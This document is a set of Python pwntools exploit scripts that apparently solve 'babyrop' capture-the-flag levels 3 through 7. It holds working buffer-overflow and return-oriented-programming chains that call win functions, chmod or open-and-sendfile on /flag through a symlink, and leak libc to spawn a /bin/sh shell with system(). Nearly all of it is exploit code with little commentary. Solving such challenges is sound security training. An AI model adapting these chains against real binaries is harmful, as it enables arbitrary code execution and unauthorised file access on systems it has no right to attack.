

# lvl 3-0 

```py
from pwn import *

elf = ELF("/challenge/babyrop_level3.0")

offset =  0x48

pop_rdi = p64(0x0000000000401fd3)

win1 = p64(0x401865)
win2 = p64(0x401A24)
win3 = p64(0x401B04)
win4 = p64(0x401BE6)
win5 = p64(0X401941)  

wins = [win1, win2, win3, win4, win5]

payload = b"A" * offset

for i in range(1, 6):
    print(i)
    payload += pop_rdi + p64(i) + wins[i-1]

p = process(elf.path)
p.send(payload)
p.interactive()
```


# lvl 4-1


```py
from pwn import *

elf = ELF("/challenge/babyrop_level4.1")

offset =  0x88

pop_rdi = p64(0x00000000004016b1)
pop_rax = p64(0x0000000000401699)
pop_rsi = p64(0x0000000000401689)
syscall = p64(0x00000000004016c1)

address = offset + 48 + 8

p = process(elf.path)
print(p.recv().decode())
address += int(input(), 16)

payload = offset*b'a' + pop_rsi + p64(6) + pop_rdi + p64(address) + pop_rax + p64(0x5a) + syscall + b"/flag\x00\x00\x00"
p.send(payload)
p.interactive()
```


# lvl 5 

```py
from pwn import *


elf = ELF("/challenge/babyrop_level5.1")
rop = ROP(elf)
rdi = p64(rop.find_gadget(['pop rdi','ret'])[0]) 
rsi = p64(rop.find_gadget(['pop rsi','ret'])[0])
rax = p64(rop.find_gadget(['pop rax','ret'])[0])
syscall = p64(rop.find_gadget(['syscall','ret'])[0])

# address_leaving = 0x402004
address_leaving = next(elf.search(b"Leaving!"))
offset = 0x28

p = process(elf.path)
print(p.recv().decode())

payload = offset*b'a' + rsi + p64(6) + rdi + p64(address_leaving) + rax + p64(0x5a) + syscall 
p.send(payload)
p.interactive()
```


# lvl 6 

```py
from pwn import *


elf = ELF('/challenge/babyrop_level6.0')
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 

p = process(elf.path)

POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
RET = rop.find_gadget(['ret']).address


padding = b'A' * 0x78

log.info(f"Found 'pop rdi; ret' gadget at: {hex(POP_RDI)}")
log.info(f"Address of puts@plt: {hex(elf.plt['puts'])}")
log.info(f"Address of puts@got: {hex(elf.got['puts'])}")
log.info(f"Address of main function: {hex(elf.symbols['main'])}")



leak_payload = b''
leak_payload += padding
leak_payload += p64(POP_RDI)      
leak_payload += p64(elf.got['puts']) 
leak_payload += p64(elf.plt['puts'])    
leak_payload += p64(elf.symbols['main'])

log.info("Sending Stage 1 payload to leak libc address...")
p.send(leak_payload)

out = p.recv()
print(out)
out = p.recv()
print(out)
leaked_raw = (out.split(b"\n")[-3][0:])

leaked_puts = u64(leaked_raw.ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']

SYSTEM_ADDR = libc.symbols['system']
BIN_SH_ADDR = next(libc.search(b'/bin/sh'))

print(f"libc Base Address: {hex(libc.address)}")
print(f"System Address: {hex(SYSTEM_ADDR)}")
print(f"/bin/sh Address: {hex(BIN_SH_ADDR)}")

exploit_payload = b''
exploit_payload += padding
#exploit_payload += p64(RET) 
exploit_payload += p64(POP_RDI)        
exploit_payload += p64(BIN_SH_ADDR)  
exploit_payload += p64(SYSTEM_ADDR)   

log.info("Sending Stage 2 payload to get a shell...")
p.send(exploit_payload)

p.interactive()
```


```py
from pwn import *

binary_path = '/challenge/babyrop_level6.0'
buffer_overflow_length = 0x78  

# Function addresses 
func_open = 0x4011D0
func_sendfile = 0x4011a0
string_leaving_symlink = 0X40335A  

process(["ln", '-s', '/flag', 'Leaving!']).clean()

elf = ELF(binary_path)
rop = ROP(elf)

gadget_pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
gadget_pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
gadget_pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
gadget_pop_rcx = rop.find_gadget(['pop rcx', 'ret'])[0]

p = process([binary_path])

payload = b'A' * buffer_overflow_length  # Padding to overflow buffer

payload += p64(gadget_pop_rdi)
payload += p64(string_leaving_symlink)  # rdi = pointer to "Leaving!"
payload += p64(gadget_pop_rsi)
payload += p64(0)                        # rsi = O_RDONLY
payload += p64(func_open)               # Call open("Leaving!", O_RDONLY)

payload += p64(gadget_pop_rdi)
payload += p64(1)                        # rdi = stdout (fd 1)
payload += p64(gadget_pop_rsi)
payload += p64(3)                        # rsi = fd from open() → should be 3
payload += p64(gadget_pop_rdx)
payload += p64(0)                        # rdx = offset
payload += p64(gadget_pop_rcx)
payload += p64(100)                      # rcx = count of bytes
payload += p64(func_sendfile)           # Call sendfile(stdout, fd, 0, 100)

p.send(payload)
print(p.clean().decode(errors='ignore'))

print(process(["/usr/bin/cat", 'Leaving!']).clean().decode(errors='ignore'))
print(process(["rm", 'Leaving!']).clean().decode(errors='ignore'))

```

```py
from pwn import *


challenge_name = '/challenge/babyrop_level7.0'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
buf_size = 0x88 
leaving_addr = 0x40348A
p = process(["ln", '-s', '/flag', 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))

           
libc_elf = ELF(libc_name)
system_offset_libc = libc_elf.symbols['system']
chmod_offset_libc = libc_elf.symbols['chmod']

elf = ELF(challenge_name) 
rop = ROP(elf)  
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]  

p = process([challenge_name])
leak_line = p.recvline_contains(b'[LEAK]')
system_addr = int(leak_line.split(b'is: ')[1][:-1], 16)
base_addr = system_addr - system_offset_libc
payload = buf_size * b'A'

payload += p64(pop_rdi)
payload += p64(leaving_addr)    
payload += p64(pop_rsi)
payload += p64(0o777) 
payload += p64(0o777)    
payload += p64(chmod_offset_libc + base_addr)


p.send(payload)

answer = p.clean()
print(answer.decode(errors='ignore'))


p = process(["/usr/bin/cat", 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))

p = process(["rm", 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))
```